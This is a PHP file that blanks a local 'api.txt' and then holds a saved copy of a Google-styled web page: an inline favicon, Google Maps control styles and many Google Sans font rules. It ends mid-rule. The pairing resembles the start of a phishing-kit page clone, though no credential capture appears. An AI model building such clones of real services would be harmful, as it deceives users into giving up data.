<?php
$blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);
?>
<!doctype html>
<html lang="en">
    <head>
        <link
            rel="icon"
            data-savepage-href="https://space.word.com/favicon.ico"
            href="data:image/x-icon;base64,AAABAAIAICAAAAEAGACoDAAAJgAAABAQAAABABgAaAMAAM4MAAAoAAAAIAAAAEAAAAABABgAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAA/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////f/+//////7///7///7////+//7////+//7//v7+///7///////////////////////////+///+/f////////7//P/9///+//7//////f////////7////+/////f/+/v3//////////v/9/f/+/f7///7////+/////f///P7+/f////////3////////+/f////7/////+//+////+//+//7/+v7////8/////////f////7////++/////7+klW3fDKodCehaRaaaBmedC6jiFix0bjk/f/+//////7//v7+ya7aekOqZyCZYwyYaSGdfkipx67a//////7////////+////7uT0dDukYzaXr37I////////+///////QACBTACNTACITwCOSgCJNgB3LAFyPQCAwZjV/v/9//7/nWrBOwF+LQB1OgJ/TQCHOwJ9LQB3OwF+q33G///+/v3//f//////k1O3KQB0OwCARwCG59vt/f///v3///7/YQ6ZRACDh0Oy5tzt5NftwKLXax6dOgB9RwCH//7/18HkMAB2PQCAZRWYwZ7W2cbnupbSYw6YPgCCMAB5vZrS//7/////9fH3TwGLSACJSgCINAB+lFS3/////f/+////YgyaOgB9l2S+//7//P7+/f//uY7NNAF7RAKHzrTcgDutNgB8WRGT8+b0///+/v7+//7/4tbsTQGJOQB7ciGg//7//f/+upLTNwB7ahqbgTyuQACCYAqW//7+/v3////+YQ+YPQB+k1m4/v7+///8/Pv/kli3NgB7WgCWtIjLWQCUOgB/lla2/f////7///7//////f//k1O2MQF5XQWU/P7+////axefKgBzm2K9+fj8UQCLMwB5wZ/b/f///P7+YgyaVgGRXQqVbx2ebB+faxidTgCKSgyIxafY2MblQQCFOAB9sonM/f///f/+///////////+uo/SMQB7UgGM////1cTlPwB+MgF7s4fM/f/+dSSjLAB1cBuh/v3////+Yw2ZXACWVACOTgCJRACDMAB4PAB9i0Oz//7/0rvhQACAOAB9r4bJ/f/////////+///////+s4rOMwB5TwCO////oHC/MQF5TgCK6Nvx///+pXbFOQB8PwCF07/i////YgyYPgCEik6y9ev76NzuvJbSVAuPQgaC4M3o8u32QwCHOwCAjEm2//////7//////////P7+iESxMQF5cSCe7+P1aBScLQB4iUSz/f/+//3+8On2UAKMLwFyq3PG///+YQ+YNwF8oGy//////f/+/P7+eiypHgFolF26////cSSjNAF6VgmQ28vq///+/f///f/+z7rgSgGHNAF7ll24wqLYOgF8RACDzrbe/f////7//f//jEqzLAF0aRWd/Pv9YgyaSwGJfjiq07nhyazdnmS9UgGMJwBzq33J////3cvqNwF6OAF8UQCNqXrGw6TXoG3EVACPOQF+RACG4svrgkCxNQB5ZA2Z///+/////////v/90LXhQwCCMwB7xqfaPgCCQwCEOQB7LAB3KgF0IgBsLAB3fDOn+fX6/v7+///+vJHUTQGJKwBzNwB7RQCGNgB6LQB1TACH17jl7+bzLQF2GwBogDyr//7///7//////f//8+zzRwCGFwJlZhOYlmK8kFi3lFa6jVG1jlK2kmG1tZjP/////////f///////f//5tbulGO5ZiGaWg2UaiadlWi35dPw///+073ge0urfk+s17/i+////f/////+//7///7/q3nHgU+tmWG6/////////f/////////+//////////7////+//7////////+/////f/////+//7//f////////7////+/f/+///////++v7//v3///7///7//////f/////+//////7///3////////+/f///f////7////+/f/+/f//////+//+/////f/////+/////////f/+//7////+//////7//////v7+///+///+/v3////8//7//f/+//////7////+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAAAEAAAACAAAAABABgAAAAAAAADAAAAAAAAAAAAAAAAAAAAAAAA/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////v7+/v7+/v7+//7+/v7+/f79//7////+/v7+/f/+/v7+/f7+//7+/v////7+/f7+ZiGbXg+UVxGQcESh7uXz5tnvajydVAuNUxqOq4rH/v7+/v/+h1ywZS2Z+Pb6/f7/UAaMwKDX593wZCuYlm26bz+ge0On5djuv57VPQB/y63c6uDxTgaKTw+NvJbS/v7+VQeQl1+6tIzNWBmRqn3HQwCF0Lfg/v7+/v/+azifqoDHn3bAajqdr4bKZC6a/f7+VwaSiE6xhlyuVxWQ6NzvPQCBzbPf//7+/v7+ZzOcq4DIWSGTr4fL5NbtPQB/38zpUQeNvJfS2MPlRAuEz7bgbjygbjWg2sfmsInMPgCBr4LLRQOE8uz2/v7+ckCil227aS6eYSmYWy2Sl3K7/Pz97eP0fE6oTwuLWCOQwaLWmnu9fFKo/f7//v7+uZjPZTGZ//7//v/+/v7+/v7+/v7+/v/+/v/+//7+/v7+//7+/v7+/f7+/v3+//7+/v/+//7+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
        />
        <style>
            .ssQIHO-checkbox-menu-item > span > span {
                background-color: #000;
                display: inline-block;
            }
            @media (forced-colors: active), (prefers-contrast: more) {
                .ssQIHO-checkbox-menu-item > span > span {
                    background-color: ButtonText;
                }
            }
        </style>
        <style>
            .gm-style .gm-style-mtc label,
            .gm-style .gm-style-mtc div {
                font-weight: 400;
            }
            .gm-style .gm-style-mtc ul,
            .gm-style .gm-style-mtc li {
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
            }
            .gm-style-mtc-bbw {
                display: -webkit-box;
                display: -webkit-flex;
                display: flex;
                -webkit-flex-wrap: wrap;
                flex-wrap: wrap;
            }
            .gm-style-mtc-bbw .gm-style-mtc:first-of-type > button {
                border-start-start-radius: 2px;
                border-end-start-radius: 2px;
            }
            .gm-style-mtc-bbw .gm-style-mtc:last-of-type > button {
                border-start-end-radius: 2px;
                border-end-end-radius: 2px;
            }
            sentinel {
            }
        </style>
        <style>
            .LGLeeN-keyboard-shortcuts-view {
                display: -webkit-box;
                display: -webkit-flex;
                display: -moz-box;
                display: -ms-flexbox;
                display: flex;
            }
            .LGLeeN-keyboard-shortcuts-view table,
            .LGLeeN-keyboard-shortcuts-view tbody,
            .LGLeeN-keyboard-shortcuts-view td,
            .LGLeeN-keyboard-shortcuts-view tr {
                background: inherit;
                border: none;
                margin: 0;
                padding: 0;
            }
            .LGLeeN-keyboard-shortcuts-view table {
                display: table;
            }
            .LGLeeN-keyboard-shortcuts-view tr {
                display: table-row;
            }
            .LGLeeN-keyboard-shortcuts-view td {
                -moz-box-sizing: border-box;
                box-sizing: border-box;
                display: table-cell;
                color: light-dark(#000, #fff);
                padding: 6px;
                vertical-align: middle;
                white-space: nowrap;
            }
            .LGLeeN-keyboard-shortcuts-view td:first-child {
                text-align: end;
            }
            .LGLeeN-keyboard-shortcuts-view td kbd {
                background-color: light-dark(#e8eaed, #3c4043);
                border-radius: 2px;
                border: none;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
                color: inherit;
                display: inline-block;
                font-family:
                    Google Sans Text,
                    Roboto,
                    Arial,
                    sans-serif;
                line-height: 16px;
                margin: 0 2px;
                min-height: 20px;
                min-width: 20px;
                padding: 2px 4px;
                position: relative;
                text-align: center;
            }
        </style>
        <style>
            .gm-control-active > img {
                -webkit-box-sizing: content-box;
                box-sizing: content-box;
                display: none;
                left: 50%;
                pointer-events: none;
                position: absolute;
                top: 50%;
                -webkit-transform: translate(-50%, -50%);
                -ms-transform: translate(-50%, -50%);
                transform: translate(-50%, -50%);
            }
            .gm-control-active > img:nth-child(1) {
                display: block;
            }
            .gm-control-active:focus > img:nth-child(1),
            .gm-control-active:hover > img:nth-child(1),
            .gm-control-active:active > img:nth-child(1),
            .gm-control-active:disabled > img:nth-child(1) {
                display: none;
            }
            .gm-control-active:focus > img:nth-child(2),
            .gm-control-active:hover > img:nth-child(2) {
                display: block;
            }
            .gm-control-active:active > img:nth-child(3) {
                display: block;
            }
            .gm-control-active:disabled > img:nth-child(4) {
                display: block;
            }
            sentinel {
            }
        </style>
        <style
            data-savepage-href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Google+Sans:400,500,700|Google+Sans+Text:400,500,700&lang=fr"
            type="text/css"
        >
            /*
 * See: https://fonts.google.com/license/googlerestricted
 */
            /* armenian */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiIUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0308, U+0530-058F, U+2010, U+2024, U+25CC, U+FB13-FB17;
            }
            /* bengali */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiAUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0980-09FE, U+1CD0, U+1CD2, U+1CD5-1CD6, U+1CD8, U+1CE1,
                    U+1CEA, U+1CED, U+1CF2, U+1CF5-1CF7, U+200C-200D, U+20B9, U+25CC, U+A8F1;
            }
            /* canadian-aboriginal */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPh0UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+02C7, U+02D8-02D9, U+02DB, U+0307, U+1400-167F, U+18B0-18F5, U+25CC, U+11AB0-11ABF;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPj8UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjYUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* devanagari */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjMUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0900-097F, U+1CD0-1CF9, U+200C-200D, U+20A8, U+20B9, U+20F0, U+25CC, U+A830-A839,
                    U+A8E0-A8FF, U+11B00-11B09;
            }
            /* ethiopic */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiMUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+030E, U+1200-1399, U+2D80-2DDE, U+AB01-AB2E, U+1E7E0-1E7E6, U+1E7E8-1E7EB,
                    U+1E7ED-1E7EE, U+1E7F0-1E7FE;
            }
            /* georgian */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPi0UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0589, U+10A0-10FF, U+1C90-1CBA, U+1CBD-1CBF, U+205A, U+2D00-2D2F, U+2E31;
            }
            /* greek-ext */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPj4UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjEUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            }
            /* gujarati */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPikUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A80-0AFF, U+200C-200D, U+20B9, U+25CC, U+A830-A839;
            }
            /* gurmukhi */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPhEUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A01-0A76, U+200C-200D, U+20B9, U+25CC, U+262C, U+A830-A839;
            }
            /* hebrew */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjAUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0307-0308, U+0590-05FF, U+200C-2010, U+20AA, U+25CC, U+FB1D-FB4F;
            }
            /* khmer */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjkUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+1780-17FF, U+19E0-19FF, U+200C-200D, U+25CC;
            }
            /* lao */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjsUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0E81-0EDF, U+200C-200D, U+25CC;
            }
            /* malayalam */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPioUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0307, U+0323, U+0951-0952, U+0964-0965, U+0D00-0D7F, U+1CDA, U+1CF2, U+200C-200D,
                    U+20B9, U+25CC, U+A830-A832;
            }
            /* oriya */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPisUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0B01-0B77, U+1CDA, U+1CF2, U+200C-200D, U+20B9, U+25CC;
            }
            /* sinhala */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPi8UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0D81-0DF4, U+1CF2, U+200C-200D, U+25CC, U+111E1-111F4;
            }
            /* symbols */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPlwUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190,
                    U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F,
                    U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF,
                    U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB,
                    U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF,
                    U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382,
                    U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0,
                    U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442,
                    U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9,
                    U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7,
                    U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A,
                    U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2,
                    U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC,
                    U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD,
                    U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9,
                    U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9,
                    U+1FAF0-1FAF8, U+1FB00-1FBFF;
            }
            /* tamil */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiQUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0B82-0BFA, U+200C-200D, U+20B9, U+25CC;
            }
            /* telugu */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPi4UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0C00-0C7F, U+1CDA, U+1CF2, U+200C-200D, U+25CC;
            }
            /* thai */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiYUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+02D7, U+0303, U+0331, U+0E01-0E5B, U+200C-200D, U+25CC;
            }
            /* vietnamese */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPj0UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301,
                    U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjwUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329,
                    U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
                    U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjIUvQ.woff2*/
                    url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308,
                    U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* armenian */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiIUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0308, U+0530-058F, U+2010, U+2024, U+25CC, U+FB13-FB17;
            }
            /* bengali */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiAUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0980-09FE, U+1CD0, U+1CD2, U+1CD5-1CD6, U+1CD8, U+1CE1,
                    U+1CEA, U+1CED, U+1CF2, U+1CF5-1CF7, U+200C-200D, U+20B9, U+25CC, U+A8F1;
            }
            /* canadian-aboriginal */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPh0UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+02C7, U+02D8-02D9, U+02DB, U+0307, U+1400-167F, U+18B0-18F5, U+25CC, U+11AB0-11ABF;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPj8UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjYUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* devanagari */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjMUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0900-097F, U+1CD0-1CF9, U+200C-200D, U+20A8, U+20B9, U+20F0, U+25CC, U+A830-A839,
                    U+A8E0-A8FF, U+11B00-11B09;
            }
            /* ethiopic */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiMUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+030E, U+1200-1399, U+2D80-2DDE, U+AB01-AB2E, U+1E7E0-1E7E6, U+1E7E8-1E7EB,
                    U+1E7ED-1E7EE, U+1E7F0-1E7FE;
            }
            /* georgian */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPi0UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0589, U+10A0-10FF, U+1C90-1CBA, U+1CBD-1CBF, U+205A, U+2D00-2D2F, U+2E31;
            }
            /* greek-ext */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPj4UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjEUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            }
            /* gujarati */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPikUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A80-0AFF, U+200C-200D, U+20B9, U+25CC, U+A830-A839;
            }
            /* gurmukhi */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPhEUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A01-0A76, U+200C-200D, U+20B9, U+25CC, U+262C, U+A830-A839;
            }
            /* hebrew */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjAUvaYr.woff2*/
